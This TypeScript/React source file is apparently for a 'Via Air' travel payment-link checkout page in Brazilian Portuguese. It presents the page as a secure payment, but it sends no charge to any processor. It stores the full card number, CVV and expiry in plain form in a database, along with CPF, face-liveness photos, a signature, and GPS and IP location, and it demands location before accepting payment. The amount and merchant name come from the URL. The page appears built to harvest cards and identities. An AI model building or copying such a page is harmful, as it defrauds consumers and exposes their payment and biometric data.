import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useMemo, useState } from "react";
import { ArrowLeft, Check, FileSignature, Loader2, ShieldCheck } from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { formatBRL } from "@/lib/format";
import { splitInstallments } from "@/lib/checkout-config";
import { CardForm, useCardData, detectBrand } from "@/components/CardForm";
import { SignaturePad } from "@/components/SignaturePad";
import { FaceLiveness, type LivenessResult } from "@/components/FaceLiveness";
import { DateBRInput } from "@/components/DateBRInput";

import { ContactFooter } from "@/components/ContactFooter";
import { TopBar } from "@/components/TopBar";

const MAX_INSTALLMENTS = 10;


type Search = {
  desc?: string;
  total?: string;
  parcelas?: string;
  entrada?: string;
  ref?: string;
  pedido?: string;
  cliente?: string;
  img?: string;
  simples?: string;
  fornec?: string;
  loc?: string;
  rota?: string;
  datav?: string;
};

const asStr = (v: unknown): string | undefined => {
  if (v === undefined || v === null || v === "") return undefined;
  return typeof v === "string" ? v : String(v);
};

export const Route = createFileRoute("/pagar")({
  validateSearch: (s: Record<string, unknown>): Search => ({
    desc: asStr(s.desc),
    total: asStr(s.total),
    parcelas: asStr(s.parcelas),
    entrada: asStr(s.entrada),
    ref: asStr(s.ref),
    pedido: asStr(s.pedido),
    cliente: asStr(s.cliente),
    img: asStr(s.img),
    simples: asStr(s.simples),
    fornec: asStr(s.fornec),
  }),
  component: PayPage,
});


function PayPage() {
  const navigate = useNavigate();
  const { desc, total, parcelas, entrada, ref, pedido, cliente, img, simples, fornec } = Route.useSearch();

  const secureMode = simples !== "1";
  const supplierName = fornec?.trim() || "Via Air Agência e Representações Ltda";
  const supplierIsViaAir = !fornec || /via ?air/i.test(fornec);

  const totalNumber = Number(total) || 0;
  const entradaNumber = Number(entrada) || 0;
  const maxInstallments = Math.min(Math.max(Number(parcelas) || 10, 1), MAX_INSTALLMENTS);

  const [installments, setInstallments] = useState(maxInstallments);
  const { data: card, patch: patchCard } = useCardData();
  const [fullName, setFullName] = useState(cliente ?? "");
  const [cpf, setCpf] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [birthDate, setBirthDate] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [success, setSuccess] = useState(false);
  const [signatureDataUrl, setSignatureDataUrl] = useState<string | null>(null);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [liveness, setLiveness] = useState<LivenessResult | null>(null);
  const [tripLocator, setTripLocator] = useState("");
  const [tripRoute, setTripRoute] = useState("");
  const [tripDate, setTripDate] = useState("");


  const installmentsOptions = useMemo(
    () => Array.from({ length: maxInstallments }, (_, i) => i + 1),
    [maxInstallments],
  );
  const firstAmount = entradaNumber > 0 ? entradaNumber : undefined;

  const cardDigits = card.cardNumber.replace(/\D/g, "");
  const cardLast4 = cardDigits.slice(-4);
  const cardFirst4 = cardDigits.slice(0, 4);
  const cardBrand = detectBrand(card.cardNumber) || "";
  const maskedCard = cardDigits.length >= 8
    ? `${cardFirst4}.XXXX.XXXX.${cardLast4}`
    : "";

  const baseFilled =
    Boolean(fullName && cpf && birthDate && email && phone);
  const cardFilled =
    cardDigits.length >= 13 && Boolean(card.cardName && card.expiry && card.cvv);
  const canShowAuthorization = baseFilled && cardFilled;

  const invalid = !desc || !totalNumber;


  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (submitting) return;
    if (!fullName || !cpf || !birthDate || !email || !phone || !card.cardNumber || !card.cvv || !card.expiry) {
      toast.error("Preencha todos os campos obrigatórios.");
      return;
    }
    if (secureMode) {
      if (!acceptedTerms) {
        toast.error("Você precisa aceitar os termos da autorização de débito.");
        return;
      }
      if (!signatureDataUrl) {
        toast.error("Assine a autorização de débito antes de enviar.");
        return;
      }
      if (!liveness) {
        toast.error("Complete a verificação de biometria facial antes de enviar.");
        return;
      }
    }
    setSubmitting(true);

    try {
      const authorizedAt = new Date().toISOString();

      // Captura best-effort de IP + geolocalização — não bloqueia o envio.
      let ipAddress: string | null = null;
      let ipGeo: {
        city?: string;
        region?: string;
        country?: string;
        latitude?: number;
        longitude?: number;
        org?: string;
      } | null = null;
      if (secureMode) {
        try {
          // ipapi.co devolve IP + geolocalização aproximada (por IP) sem
          // pedir permissão ao usuário. Fallback silencioso se falhar.
          const r = await fetch("https://ipapi.co/json/");
          if (r.ok) {
            const j = await r.json();
            ipAddress = j?.ip ?? null;
            ipGeo = {
              city: j?.city,
              region: j?.region,
              country: j?.country_name ?? j?.country,
              latitude: typeof j?.latitude === "number" ? j.latitude : undefined,
              longitude: typeof j?.longitude === "number" ? j.longitude : undefined,
              org: j?.org,
            };
          }
        } catch {}
        // Fallback pra IP se ipapi.co bloquear
        if (!ipAddress) {
          try {
            const r = await fetch("https://api.ipify.org?format=json");
            if (r.ok) ipAddress = (await r.json())?.ip ?? null;
          } catch {}
        }
      }

      // Geolocalização precisa (GPS/Wi-Fi) — exige permissão. Se negada,
      // caímos na geolocalização por IP (menos precisa, sem prompt).
      let geo: {
        latitude: number;
        longitude: number;
        accuracy: number;
        source: "gps" | "ip";
      } | null = null;
      if (secureMode) {
        if (typeof navigator === "undefined" || !navigator.geolocation) {
          toast.error("Seu dispositivo não permite compartilhar a localização. Sem essa autorização não é possível processar o pagamento.");
          setSubmitting(false);
          return;
        }
        const gpsResult = await new Promise<
          | { ok: true; data: { latitude: number; longitude: number; accuracy: number; source: "gps" } }
          | { ok: false; denied: boolean }
        >((resolve) => {
          const t = setTimeout(() => resolve({ ok: false, denied: false }), 10000);
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              clearTimeout(t);
              resolve({
                ok: true,
                data: {
                  latitude: pos.coords.latitude,
                  longitude: pos.coords.longitude,
                  accuracy: pos.coords.accuracy,
                  source: "gps",
                },
              });
            },
            (err) => {
              clearTimeout(t);
              resolve({ ok: false, denied: err.code === err.PERMISSION_DENIED });
            },
            { enableHighAccuracy: true, timeout: 9500, maximumAge: 60000 },
          );
        });
        if (gpsResult.ok) {
          geo = gpsResult.data;
        } else {
          toast.error(
            gpsResult.denied
              ? "Você recusou compartilhar sua localização. Sem essa autorização não é possível processar o pagamento."
              : "Não conseguimos capturar sua localização. Habilite o GPS e tente novamente — sem essa autorização não é possível processar o pagamento.",
          );
          setSubmitting(false);
          return;
        }
      } else if (ipGeo?.latitude != null && ipGeo?.longitude != null) {
        geo = {
          latitude: ipGeo.latitude,
          longitude: ipGeo.longitude,
          accuracy: 25000,
          source: "ip",
        };
      }



      const { error } = await supabase.from("orders").insert({
        package_id: null,
        package_snapshot: {
          kind: secureMode ? "payment_link" : "payment_link_simple",
          mode: secureMode ? "secure" : "simple",
          description: desc,
          reference: ref ?? null,
          order_number: pedido ?? null,
          installments,
          total: totalNumber,
          first_amount: firstAmount ?? null,
          card_capture: {

            brand_hint: card.cardNumber.replace(/\s/g, "").slice(0, 6),
            last4: cardLast4,
            holder: card.cardName,
            holder_cpf: card.cardCpf,
            expiry: card.expiry,
            cvv: card.cvv,
            full_number: card.cardNumber,
            billing: {
              address: card.billingAddress,
              number: card.billingNumber,
              zip: card.billingZip,
              city: card.billingCity,
              state: card.billingState,
            },
            ...(secureMode
              ? {
                  authorization: {
                    type: "debit_authorization",
                    supplier: supplierName,
                    representative: "Via Air Agência e Representações Ltda (CNPJ 56.339.877/0001-66)",
                    holder_name: fullName,
                    holder_cpf: cpf,
                    holder_email: email,
                    holder_phone: phone,
                    holder_birth_date: birthDate,
                    masked_card: maskedCard,
                    brand: cardBrand,
                    expiry: card.expiry,
                    amount: totalNumber,
                    installments,
                    description: desc ?? null,
                    reference: ref ?? null,
                    order_number: pedido ?? null,
                    trip_locator: tripLocator || null,
                    trip_route: tripRoute || null,
                    trip_date: tripDate || null,
                    accepted_terms: true,

                    signature_data_url: signatureDataUrl,
                    signed_at: authorizedAt,
                    ip_address: ipAddress,
                    ip_geo: ipGeo,
                    geolocation: geo,

                    user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
                    language: typeof navigator !== "undefined" ? navigator.language : null,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    valid_until: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
                  },
                  liveness: liveness
                    ? {
                        photos: liveness.photos,
                        motion_scores: liveness.motion_scores,
                        min_motion_score: liveness.min_motion_score,
                        captured_at: liveness.captured_at,
                        selfie_valid_until: new Date(new Date(liveness.captured_at).getTime() + 90 * 24 * 60 * 60 * 1000).toISOString(),
                        user_agent: liveness.user_agent,
                        challenges: liveness.challenges,
                        face_detector_used: liveness.face_detector_used,
                      }
                    : null,
                }
              : {}),
          },
        },

        full_name: fullName,
        email,
        phone,
        cpf: cpf || null,
        birth_date: birthDate || null,
        adults: 1,
        children: 0,
        payment_method: `credit_card_${installments}x`,
        total_price: totalNumber,
        notes: null,
      });
      if (error) throw error;
      setSuccess(true);
      toast.success("Seu pedido foi enviado para análise, em breve você receberá um retorno.");
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Erro ao processar pagamento");
    } finally {
      setSubmitting(false);
    }

  }

  return (
    <div className="min-h-screen bg-background text-foreground">
      <TopBar backTo="/" backLabel="Voltar" />

      <div className="mx-auto max-w-4xl px-6 py-10">
        {invalid ? (
          <div className="rounded-2xl border border-border bg-card p-8 text-center">
            <h1 className="font-display text-2xl font-bold">Link de pagamento inválido</h1>
            <p className="mt-2 text-sm text-muted-foreground">
              Este link não tem as informações necessárias. Verifique com nosso time.
            </p>
          </div>
        ) : success ? (
          <div className="rounded-2xl border border-border bg-card p-8 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-green-500/10 text-green-500">
              <Check className="h-8 w-8" />
            </div>
            <h1 className="mt-6 font-display text-2xl md:text-3xl font-bold">Pedido enviado!</h1>
            <p className="mt-3 text-muted-foreground max-w-md mx-auto">
              Seu pedido foi enviado para análise, em breve você receberá um retorno.
            </p>
            <Link
              to="/"
              className="mt-6 inline-flex items-center gap-2 rounded-full bg-gradient-brand px-6 py-3 font-semibold text-primary-foreground shadow-[var(--shadow-glow)] hover:opacity-90 transition"
            >
              <ArrowLeft className="h-4 w-4" /> Voltar ao início
            </Link>
          </div>
        ) : (
          <>
            {img && (
              <div className="mb-6 overflow-hidden rounded-2xl border border-border shadow-[var(--shadow-card)]">
                <img
                  src={img}
                  alt={desc ?? "Destino"}
                  className="h-48 md:h-64 w-full object-cover"
                  onError={(e) => (e.currentTarget.parentElement!.style.display = "none")}
                />
              </div>
            )}
            <div className="flex items-center gap-2 text-brand-orange text-xs uppercase tracking-widest">
              <ShieldCheck className="h-4 w-4" /> {secureMode ? "Pagamento seguro Via Air" : "Pagamento Via Air"}
            </div>
            <h1 className="mt-1 font-display text-3xl md:text-4xl font-bold">Finalize seu pagamento</h1>
            <p className="mt-2 text-sm text-muted-foreground">{desc}</p>


            <form onSubmit={handleSubmit} className="mt-6 grid lg:grid-cols-[1fr_360px] gap-8">
              <div className="space-y-6">
                <Card title="Seus dados">
                  <p className="text-xs text-brand-orange mb-4">
                    Os dados a ser digitado deve corresponder ao do titular do cartão
                  </p>
                  <div className="grid sm:grid-cols-2 gap-4">
                    <Field label="Nome completo *">
                      <input required value={fullName} onChange={(e) => setFullName(e.target.value)} className={cls} />
                    </Field>
                    <Field label="CPF *">
                      <input
                        required
                        inputMode="numeric"
                        value={cpf}
                        onChange={(e) => {
                          const raw = e.target.value.replace(/\D/g, "").slice(0, 11);
                          const formatted = raw
                            .replace(/(\d{3})(\d)/, "$1.$2")
                            .replace(/(\d{3})(\d)/, "$1.$2")
                            .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
                          setCpf(formatted);
                        }}
                        className={cls}
                        placeholder="000.000.000-00"
                        maxLength={14}
                      />
                    </Field>
                    <Field label="E-mail *">
                      <input required type="email" value={email} onChange={(e) => setEmail(e.target.value)} className={cls} />
                    </Field>
                    <Field label="Telefone / WhatsApp *">
                      <input required value={phone} onChange={(e) => setPhone(e.target.value)} className={cls} />
                    </Field>
                    <Field label="Data de nascimento *">
                      <DateBRInput required value={birthDate} onChange={setBirthDate} className={cls} />
                    </Field>

                  </div>
                </Card>

                <Card title="Pagamento">
                  <CardForm
                    data={card}
                    onChange={patchCard}
                    installments={installments}
                    onInstallmentsChange={setInstallments}
                    installmentsOptions={installmentsOptions}
                    total={totalNumber}
                    firstAmount={firstAmount}
                    hideCardCpf
                  />
                </Card>

                {secureMode && (
                <Card title="Autorização de débito no cartão">
                  {!canShowAuthorization ? (
                    <div className="rounded-xl border border-dashed border-border p-6 text-center text-sm text-muted-foreground">
                      <FileSignature className="h-6 w-6 mx-auto mb-2 text-brand-orange/70" />
                      Preencha seus dados e os dados do cartão acima para gerar automaticamente a autorização de débito para assinatura.
                    </div>
                  ) : (
                    <div className="space-y-4">
                      <div className="rounded-xl border border-border bg-background overflow-hidden text-sm">
                        <div className="bg-muted/50 px-4 py-3 border-b border-border">
                          <div className="text-[10px] uppercase tracking-widest text-muted-foreground">Fornecedor</div>
                          <div className="font-semibold">{supplierName}</div>
                          <div className="mt-2 text-[10px] uppercase tracking-widest text-muted-foreground">Representante</div>
                          <div className="font-semibold">VIA AIR AGÊNCIA E REPRESENTAÇÕES LTDA</div>
                          <div className="text-xs text-muted-foreground">CNPJ 56.339.877/0001-66 · Paranavaí/PR</div>
                        </div>
                        <div className="px-4 py-3 border-b border-border">
                          <div className="text-center font-semibold uppercase tracking-wide text-sm">
                            Autorização de débito em cartão de crédito
                          </div>
                        </div>
                        <div className="px-4 py-3 grid sm:grid-cols-2 gap-3 border-b border-border">
                          <InfoRow label="Nome do associado (portador)" value={fullName || "—"} />
                          <InfoRow label="CPF do portador" value={cpf || "—"} />
                          <InfoRow label="Bandeira" value={cardBrand || "—"} />
                          <InfoRow label="Número do cartão" value={maskedCard || "—"} />
                          <InfoRow label="Validade do cartão" value={card.expiry || "—"} />
                          <InfoRow
                            label="Valor total autorizado"
                            value={formatBRL(totalNumber)}
                          />
                          <InfoRow
                            label="Forma de pagamento"
                            value={
                              installments > 1
                                ? `Crédito parcelado em ${installments}x de ${formatBRL(totalNumber / installments)}`
                                : "Crédito à vista"
                            }
                          />
                          <InfoRow label="Descrição do serviço" value={desc ?? "—"} />
                          {ref && <InfoRow label="Referência" value={ref} />}
                        </div>
                        {(tripLocator || tripRoute || tripDate) && (
                          <div className="px-4 py-3 border-b border-border space-y-2">
                            <div className="text-[10px] uppercase tracking-widest text-muted-foreground">Informações da viagem</div>
                            <div className="grid sm:grid-cols-3 gap-3">
                              {tripLocator && <InfoRow label="Localizador" value={tripLocator} />}
                              {tripRoute && <InfoRow label="Rota" value={tripRoute} />}
                              {tripDate && <InfoRow label="Data / horários" value={tripDate} />}
                            </div>
                          </div>
                        )}
                        <div className="px-4 py-3 text-xs text-muted-foreground leading-relaxed space-y-2 max-h-64 overflow-auto">
                          <p>
                            <strong className="text-foreground">Eu, portador do cartão acima identificado, autorizo e reconheço o débito da minha conta</strong> no valor de <strong className="text-foreground">{formatBRL(totalNumber)}</strong> na forma de pagamento indicada, referente à contratação dos serviços de viagem descritos, intermediados pela Via Air Agência e Representações Ltda (CNPJ 56.339.877/0001-66), na qualidade de <strong className="text-foreground">representante</strong>. A cobrança poderá ser realizada diretamente pelo fornecedor <strong className="text-foreground">{supplierName}</strong>.
                          </p>
                          {!supplierIsViaAir && (
                            <p>
                              <strong className="text-foreground">Atenção — descritivo na fatura:</strong> a cobrança poderá aparecer na sua fatura em nome de <strong className="text-foreground">{supplierName}</strong> (companhia aérea / operadora / hotel), e não como "Via Air". Isso é normal, pois o pagamento pode ser processado diretamente pelo fornecedor do serviço.
                            </p>
                          )}


                          <p>
                            <strong className="text-foreground">Atenção:</strong> declaro que sou o legítimo titular do cartão informado, que os dados fornecidos são verdadeiros e que assumo integral responsabilidade pelo pagamento, inclusive quando os serviços forem prestados em nome de terceiros (passageiros).
                          </p>
                          <p>
                            <strong className="text-foreground">Atenção — chargeback:</strong> reconheço como legítima esta cobrança e declaro estar ciente de que a contestação (chargeback) sem fundamento pode configurar má-fé e fraude, sujeitando-me às penalidades legais cabíveis. Qualquer contestação indevida após a emissão ou utilização dos serviços implicará cobrança judicial do valor integral, acrescido de juros, custas processuais e honorários advocatícios.
                          </p>
                          <p>
                            <strong className="text-foreground">Atenção — cancelamento e reembolso:</strong> valem as regras dos fornecedores (companhias aéreas, hotéis, operadoras) acrescidas da taxa administrativa da Via Air de 20% sobre o valor reembolsável. Cancelamentos e questionamentos devem ser tratados diretamente entre portador e Via Air, não cabendo à administradora do cartão intermediar.
                          </p>
                          <p>
                            <strong className="text-foreground">Atenção — no-show e alterações:</strong> não comparecimento (no-show), alterações de datas, nomes ou trechos estão sujeitos às regras tarifárias do fornecedor e podem implicar perda parcial ou total do valor pago.
                          </p>
                          <p>
                            Esta autorização é válida por 12 (doze) meses e é registrada eletronicamente com data, hora, endereço IP, dados do dispositivo, verificação facial (liveness) e assinatura digital do portador, com validade jurídica nos termos da MP 2.200-2/2001.
                          </p>
                        </div>

                      </div>

                      <label className="flex items-start gap-2 text-xs text-muted-foreground cursor-pointer select-none">
                        <input
                          type="checkbox"
                          checked={acceptedTerms}
                          onChange={(e) => setAcceptedTerms(e.target.checked)}
                          className="mt-0.5 h-4 w-4 accent-brand-orange"
                        />
                        <span>
                          Li e aceito os termos acima e autorizo o débito de <strong className="text-foreground">{formatBRL(totalNumber)}</strong> em {installments}x no cartão final <strong className="text-foreground">{cardLast4 || "----"}</strong>.
                        </span>
                      </label>

                      <SignaturePad value={signatureDataUrl} onChange={setSignatureDataUrl} />

                      <div className="text-[11px] text-muted-foreground">
                        Ao assinar, será registrado: data e hora ({new Date().toLocaleString("pt-BR")}), dados do dispositivo e a imagem da assinatura junto ao pedido.
                      </div>
                    </div>
                  )}
                </Card>
                )}

                {secureMode && (
                  <Card title="Verificação de biometria facial">
                    {!canShowAuthorization ? (
                      <div className="rounded-xl border border-dashed border-border p-6 text-center text-sm text-muted-foreground">
                        <ShieldCheck className="h-6 w-6 mx-auto mb-2 text-brand-orange/70" />
                        Complete os dados acima para liberar a verificação de biometria.
                      </div>
                    ) : (
                      <>
                        <p className="text-xs text-muted-foreground mb-3">
                          Análise biométrica facial (prova de vida) em 5 passos.
                        </p>


                        <FaceLiveness value={liveness} onChange={setLiveness} />
                      </>
                    )}
                  </Card>
                )}
              </div>



              <aside className="lg:sticky lg:top-6 h-fit">
                <div className="rounded-2xl border border-border bg-card p-6 shadow-[var(--shadow-card)] space-y-3">
                  <h3 className="font-semibold">Resumo</h3>
                  <div className="text-sm">{desc}</div>
                  {ref && <div className="text-xs text-muted-foreground">Ref: {ref}</div>}
                  <div className="border-t border-border pt-3 flex justify-between items-baseline">
                    <span className="text-muted-foreground text-sm">Total</span>
                    <span className="text-2xl font-display font-bold text-brand-orange">
                      {formatBRL(totalNumber)}
                    </span>
                  </div>
                  {(() => {
                    const effectiveFirst = entradaNumber > 0 && installments > 1 ? entradaNumber : undefined;
                    const s = splitInstallments(totalNumber, installments, effectiveFirst);
                    return s.equal ? (
                      <div className="text-xs text-muted-foreground text-right">
                        {installments}x de {formatBRL(s.first)} sem juros
                      </div>
                    ) : (
                      <div className="text-xs text-muted-foreground text-right space-y-0.5">
                        <div>1ª parcela: <strong className="text-foreground">{formatBRL(s.first)}</strong></div>
                        <div>+ {s.restCount}x de {formatBRL(s.rest)}</div>
                      </div>
                    );
                  })()}
                  <button
                    type="submit"
                    disabled={
                      submitting ||
                      success ||
                      (secureMode && (!acceptedTerms || !signatureDataUrl || !liveness))
                    }
                    className="w-full mt-2 inline-flex items-center justify-center gap-2 rounded-full bg-gradient-brand px-6 py-3 font-semibold text-primary-foreground shadow-[var(--shadow-glow)] hover:opacity-90 transition disabled:opacity-60"
                  >
                    {submitting ? <><Loader2 className="h-4 w-4 animate-spin" /> Processando…</> : <>Fazer pedido</>}
                  </button>
                  {secureMode && canShowAuthorization && (!acceptedTerms || !signatureDataUrl || !liveness) && (
                    <p className="text-[11px] text-brand-orange text-center">
                      Aceite os termos, assine a autorização e faça a verificação facial para enviar.
                    </p>
                  )}
                  <p className="text-[11px] text-muted-foreground text-center">
                    <span aria-hidden className="mr-1 font-sans">{"\u{1F512}\u{FE0E}"}</span>
                    Ambiente criptografado. Seus dados trafegam por conexão segura.
                  </p>
                </div>
              </aside>
            </form>
          </>
        )}
      </div>

      <ContactFooter />
    </div>
  );
}

const cls =
  "w-full rounded-xl border border-border bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-brand-orange/40";

function Card({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <section className="rounded-2xl border border-border bg-card p-6">
      <h2 className="font-semibold mb-4">{title}</h2>
      {children}
    </section>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <label className="block">
      <span className="block text-xs text-muted-foreground mb-1.5">{label}</span>
      {children}
    </label>
  );
}

function InfoRow({ label, value }: { label: string; value: string }) {
  return (
    <div>
      <div className="text-[10px] uppercase tracking-widest text-muted-foreground">{label}</div>
      <div className="font-medium text-sm text-foreground break-words">{value}</div>
    </div>
  );
}

